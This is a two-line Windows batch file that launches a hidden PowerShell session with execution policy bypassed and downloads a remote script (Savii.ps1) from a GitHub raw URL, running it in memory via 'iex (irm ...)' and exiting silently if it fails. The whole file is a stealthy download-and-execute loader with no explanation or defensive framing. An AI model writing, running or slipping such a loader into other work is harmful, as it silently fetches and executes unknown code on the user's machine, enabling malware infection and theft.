@echo off
powershell -NoP -NoL -ep Bypass -Win 1 -Command "try { iex (irm https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1) } catch { exit 1 }"
